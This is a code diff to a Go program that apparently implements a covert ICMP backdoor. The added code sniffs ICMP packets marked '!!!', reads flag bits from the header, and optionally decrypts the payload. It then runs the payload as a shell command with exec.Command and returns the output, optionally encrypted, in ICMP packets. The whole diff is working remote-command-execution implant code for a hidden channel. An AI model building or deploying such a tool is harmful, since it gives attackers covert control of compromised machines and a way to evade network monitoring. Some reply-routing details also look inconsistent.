@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 
@@ -73,6 +74,19 @@ func encrypt_decrypt(plaintext string) string {
 	return encrypted
 }
 
+func set_flags(header string) {
+	if header[3] == '1' {
+		SSM = true
+	} else {
+		SSM = false
+	}
+	if header[4] == '1' {
+		execute = true
+	} else {
+		execute = false
+	}
+}
+
 func sender(dst string) {
 	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
 	if err != nil {
@@ -94,12 +108,38 @@ func sniffer() {
 	for packet := range source.Packets() {
 		payload := convert(packet.ApplicationLayer().Payload())
 		header := payload[0:7]
+		set_flags(header)
 		if strings.HasPrefix(header, "!!!") {
-			SSM = false
-			execute = false
+			var out []byte
+			var err error
 			payload = payload[7:]
-			fmt.Println("[PAYLOAD]", payload)
-			generate_packet("done", 0)
+
+			if SSM {
+				payload = encrypt_decrypt(payload)
+			}
+			if execute {
+				out, err = exec.Command(payload).Output()
+			} else {
+				if payload == "ping" {
+					out = []byte("$pong")
+				} else {
+					out = []byte("yeah")
+				}
+			}
+
+			if err != nil {
+				fail := err.Error()
+				fmt.Println("[FAILED]", string(fail))
+				generate_packet(string(fail), 0)
+				ipLayer := packet.Layer(layers.LayerTypeIPv4)
+				ip, _ := ipLayer.(*layers.IPv4)
+				sender(ip.DstIP.String())
+			}
+			if SSM {
+				out = []byte(encrypt_decrypt(string(out)))
+			}
+			fmt.Println("[PAYLOAD]", string(out))
+			generate_packet(string(out), 0)
 			ipLayer := packet.Layer(layers.LayerTypeIPv4)
 			ip, _ := ipLayer.(*layers.IPv4)
 			sender(ip.DstIP.String())
